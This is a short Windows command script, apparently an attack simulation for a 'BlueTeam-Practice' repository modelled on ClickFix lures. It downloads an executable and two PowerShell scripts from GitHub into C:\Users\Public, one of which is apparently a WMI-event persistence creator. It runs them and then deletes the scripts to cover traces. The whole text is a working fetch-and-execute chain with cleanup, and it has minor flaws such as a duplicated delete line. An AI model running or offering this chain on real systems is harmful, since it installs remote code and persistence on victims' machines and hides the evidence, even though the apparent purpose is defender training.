curl -L -o C:/Users/Public/c723561.exe "https://github.com/acebird/BlueTeam-Practice/blob/main/clickfix/c723561.exe"
curl -L -o C:/Users/Public/sprint.ps1 "https://raw.githubusercontent.com/acebird/BlueTeam-Practice/refs/heads/main/clickfix/sprint.ps1"
curl -L -o C:/Users/Public/silly.ps1 "https://raw.githubusercontent.com/acebird/BlueTeam-Practice/refs/heads/main/clickfix/wmieventcreator.ps1"

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\Public\sprint.ps1
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\Public\silly.ps1
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\Public\c723561.exe

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe rm C:\Users\Public\sprint.ps1
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe rm C:\Users\Public\silly.ps1
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe rm C:\Users\Public\silly.ps1
